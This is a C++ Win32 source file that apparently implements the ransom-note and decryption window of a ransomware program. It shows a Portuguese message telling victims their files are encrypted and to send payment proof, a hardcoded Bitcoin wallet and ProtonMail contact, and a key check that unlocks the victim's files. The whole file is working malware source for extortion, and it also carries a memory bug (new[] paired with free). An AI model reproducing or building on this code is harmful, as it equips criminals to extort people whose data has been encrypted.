#pragma warning (disable : 4996)

#include <windows.h>
#include "config.h"
#include "resource.h"
#include "Crypt.h"
#include "GeneralOperations.h"

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
void CenterWindow(HWND);
void GenerateScreenComponents(HWND);
void InitWindow(HINSTANCE& hInstance);

static HWND bitcoinEdit;
static HWND emailEdit;
static HWND passwordEdit;

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
	InitWindow(hInstance);
	return 0;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg,
	WPARAM wParam, LPARAM lParam) {

	switch (msg) {
	case WM_CREATE:
		CenterWindow(hwnd);
		GenerateScreenComponents(hwnd);
		break;

	case WM_COMMAND:
		if (LOWORD(wParam) == ID_OPEN_BUTTON) {
			int len = GetWindowTextLengthW(passwordEdit) + 1;
			wchar_t* text = new wchar_t[len];
			GetWindowTextW(passwordEdit, text, len);

			std::wstring ws(text);
			std::string key(ws.begin(), ws.end());

			if (Crypt::ValidatePassword(key)) { 
				GeneralOperations::UnlockFiles(key);
			} else {
				MessageBoxW(NULL, UNSUCCESSFUL_MESSAGE, L"", MB_OK);
			}
			free(text);
		}

		if (LOWORD(wParam) == ID_CANCEL_BUTTON) {

			PostQuitMessage(0);
		}

		break;

	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	}

	return DefWindowProcW(hwnd, msg, wParam, lParam);
}

void CenterWindow(HWND hwnd) {
	RECT rc = { 0 };

	GetWindowRect(hwnd, &rc);
	int win_w = rc.right - rc.left;
	int win_h = rc.bottom - rc.top;

	int screen_w = GetSystemMetrics(SM_CXSCREEN);
	int screen_h = GetSystemMetrics(SM_CYSCREEN);

	SetWindowPos(hwnd, HWND_TOP, (screen_w - win_w) / 2, (screen_h - win_h) / 2, 0, 0, SWP_NOSIZE);
}

void GenerateScreenComponents(HWND hwnd) {

	CreateWindowW(L"Static", L"Olá! Porvavelmente você tem os seus ficheiros encriptados.", WS_CHILD | WS_VISIBLE | SS_LEFT, 20, 20, 435, 230, hwnd, (HMENU)ID_DUMMY, NULL, NULL);
	CreateWindowW(L"Static", L"Se você ja efectuou o pagamento e enviou o comprovante como foi", WS_CHILD | WS_VISIBLE | SS_LEFT, 20, 40, 435, 230, hwnd, (HMENU)ID_DUMMY, NULL, NULL);
	CreateWindowW(L"Static", L"instruído a você, verfique o seu e-mail, você já deve ter a chave.", WS_CHILD | WS_VISIBLE | SS_LEFT, 20, 60, 435, 230, hwnd, (HMENU)ID_DUMMY, NULL, NULL);
	CreateWindowW(L"Static", L"Se sim, escreva-a na caixa de texto abaixo; Se não siga as", WS_CHILD | WS_VISIBLE | SS_LEFT, 20, 80, 435, 230, hwnd, (HMENU)ID_DUMMY, NULL, NULL);
	CreateWindowW(L"Static", L"instruções que lhe foram dadas. Em caso de ajuda extra, não", WS_CHILD | WS_VISIBLE | SS_LEFT, 20, 100, 435, 230, hwnd, (HMENU)ID_DUMMY, NULL, NULL);
	CreateWindowW(L"Static", L"hesite contactar através do mesmo endereço de e-mail.", WS_CHILD | WS_VISIBLE | SS_LEFT, 20, 120, 435, 230, hwnd, (HMENU)ID_DUMMY, NULL, NULL);
	CreateWindowW(L"Static", L"Obrigado, Stuffy1337.", WS_CHILD | WS_VISIBLE | SS_LEFT, 20, 160, 435, 230, hwnd, (HMENU)ID_DUMMY, NULL, NULL);

	CreateWindowW(L"Static", L"Carteira Bitcoin", WS_CHILD | WS_VISIBLE | SS_LEFT, 20, 200, 435, 230, hwnd, (HMENU)ID_DUMMY, NULL, NULL);
	CreateWindowW(L"Static", L"Endreço E-mail", WS_CHILD | WS_VISIBLE | SS_LEFT, 20, 230, 435, 230, hwnd, (HMENU)ID_DUMMY, NULL, NULL);
	CreateWindowW(L"Static", L"Chave", WS_CHILD | WS_VISIBLE | SS_LEFT, 20, 260, 435, 230, hwnd, (HMENU)ID_DUMMY, NULL, NULL);

	CreateWindowW(L"Button", NULL, WS_CHILD | WS_VISIBLE | BS_GROUPBOX, 5, 0, 464, 340, hwnd, (HMENU)0, NULL, NULL);

	bitcoinEdit = CreateWindowW(L"Edit", NULL, WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL, 124, 200, 330, 20, hwnd, (HMENU)ID_BITCOIN_TEXT, NULL, NULL);
	emailEdit = CreateWindowW(L"Edit", NULL, WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL, 124, 230, 330, 20, hwnd, (HMENU)ID_BITCOIN_TEXT, NULL, NULL);
	passwordEdit = CreateWindowW(L"Edit", NULL, WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL, 124, 260, 330, 20, hwnd, (HMENU)ID_PASSWORD_TEXT, NULL, NULL);

	CreateWindowW(L"button", L"Desencriptar", WS_VISIBLE | WS_CHILD, 234, 300, 95, 25, hwnd, (HMENU)ID_OPEN_BUTTON, NULL, NULL);
	CreateWindowW(L"button", L"Cancelar", WS_VISIBLE | WS_CHILD, 359, 300, 95, 25, hwnd, (HMENU)ID_CANCEL_BUTTON, NULL, NULL);
	SetWindowTextW(bitcoinEdit, L"bc1qptgw3epxnmgfdne8aty9vgkmz25n3cfnl9n5n3");
	::EnableWindow(bitcoinEdit, false);
	SetWindowTextW(emailEdit, L"tcatnoc7331yffuts@protonmail.com");
	::EnableWindow(emailEdit, false);
}

void InitWindow(HINSTANCE& hInstance) {
	MSG  msg;
	WNDCLASSW wc = { 0 };
	wc.lpszClassName = L"Center";
	wc.hInstance = hInstance;
	wc.hbrBackground = GetSysColorBrush(COLOR_3DFACE);
	wc.lpfnWndProc = WndProc;
	wc.hCursor = LoadCursor(0, IDC_ARROW);
	wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));

	RegisterClassW(&wc);
	CreateWindowW(wc.lpszClassName, APPLICATION_NAME, WS_OVERLAPPEDWINDOW & ~WS_MAXIMIZEBOX | WS_VISIBLE | WS_THICKFRAME, 100, 100, 490, 385, 0, 0, hInstance, 0);

	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}